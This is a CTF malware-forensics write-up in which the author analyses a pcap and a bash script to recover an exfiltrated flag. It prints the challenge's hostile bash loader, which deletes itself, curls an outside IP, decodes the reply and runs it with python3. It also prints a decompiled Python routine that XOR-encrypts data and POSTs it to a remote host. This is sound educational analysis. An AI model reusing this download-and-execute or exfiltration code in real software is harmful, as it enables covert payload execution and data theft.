I"—!<h1 id="problem">Problem</h1>
<p>For this problem weâ€™re given a situation where a malicious program was detected on a victimâ€™s PC and provided a zip file containing a pcap (<code class="language-plaintext highlighter-rouge">evidence.pcap</code>) and a bash script (<code class="language-plaintext highlighter-rouge">mal.sh</code>).  Our goal is to determine what the malware did and recover the exfiltrated flag.</p>

<h2 id="investigation">Investigation</h2>
<p>Opening the malicious bash script we see the following:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">BASH_SOURCE</span><span class="p">[0]</span><span class="k">}</span><span class="s2">"</span>

which python3 <span class="o">&gt;</span>/dev/null
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">exit
</span><span class="k">fi

</span>which curl <span class="o">&gt;</span>/dev/null
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">exit
</span><span class="k">fi

</span><span class="nv">mac_addr</span><span class="o">=</span><span class="si">$(</span>ip addr | <span class="nb">grep</span> <span class="s1">'state UP'</span> <span class="nt">-A1</span> | <span class="nb">tail</span> <span class="nt">-n1</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span>

curl 54.80.43.46/images/banner.png?cache<span class="o">=</span><span class="si">$(</span><span class="nb">base64</span> <span class="o">&lt;&lt;&lt;</span> <span class="nv">$mac_addr</span><span class="si">)</span> <span class="nt">-H</span> <span class="s2">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span> 2&gt;/dev/null | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> /tmp/.cacheimg
python3 /tmp/.cacheimg
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/.cacheimg
</code></pre></div></div>

<p>The interesting parts of this shell script are in the final two lines where we see it use curl to retrieve an image called <code class="language-plaintext highlighter-rouge">banner.png</code> which it decodes using base64 and then saves at <code class="language-plaintext highlighter-rouge">/tmpt/.cacheimg</code> and then â€¦â€¦executes using python?  Strange, letâ€™s investigate further.</p>

<p>Opening the pcap in wireshark we can extract a couple files: the <code class="language-plaintext highlighter-rouge">banner.png</code> and a conspicuous <code class="language-plaintext highlighter-rouge">upload</code> file thatâ€™s 18kb large.</p>

<p><img src="/assets/writeup_imgs/sneakyscript0.png" alt="image of export objects window in wireshark displaying several files" /></p>

<p>Downloading the banner.png and decoding it ourselves, we can use the file utility we can confirm our earlier suspicionsâ€“this isnâ€™t a png image, itâ€™s python bytecode!</p>

<p>Using <a href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> we can translate the bytecode back into some valid python code.  Within the decompiled code we can find a <code class="language-plaintext highlighter-rouge">send()</code> function which we can see below:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s">'34.207.187.90'</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">k</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'8675309'</span>
    <span class="n">d</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">[(</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">))]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">))])</span>
    <span class="n">c</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">'POST'</span><span class="p">,</span> <span class="s">'/upload'</span><span class="p">,</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">getresponse</span><span class="p">()</span>
</code></pre></div></div>

<p>Itâ€™s XORing the data with the key <code class="language-plaintext highlighter-rouge">b'8675309'</code> and then uploading it as a base64 encoded file named <code class="language-plaintext highlighter-rouge">upload</code>!</p>

<h1 id="solution">Solution</h1>
<p>After decompiling the malicious python code, we can write a trivial function to decode &amp; decrypt the stolen data.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Unencrypt stolen data from the packet-capture
</span><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exfils/upload"</span><span class="p">)</span> <span class="k">as</span> <span class="n">enc_f</span><span class="p">:</span>
  <span class="n">content</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">enc_f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>

<span class="n">k</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'8675309'</span>  
<span class="n">unc</span> <span class="o">=</span>  <span class="nb">bytes</span><span class="p">([</span><span class="n">content</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">[(</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">))]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))])</span>
<span class="k">print</span><span class="p">(</span><span class="n">unc</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
<span class="c1"># At this point just use redirect stdout  to a file, then cat &amp; grep to find flag
</span></code></pre></div></div>

<h2 id="conclusion--lessons-learned">Conclusion &amp; Lessons Learned:</h2>
<p>Well for one, uncompyle6 is a super helpful tool and packet captures once again prove incredibly helpful!</p>

<p>At a higher-level, itâ€™s interesting to see a malicious program written in python, especially considering we often focus on C-built x86 binaries when doing CTF (specifically in many <code class="language-plaintext highlighter-rouge">pwn</code> challenges).  Itâ€™s important we note that malware can come in many formsâ€“even in a high-level â€˜modernâ€™ language like Python!</p>

:ET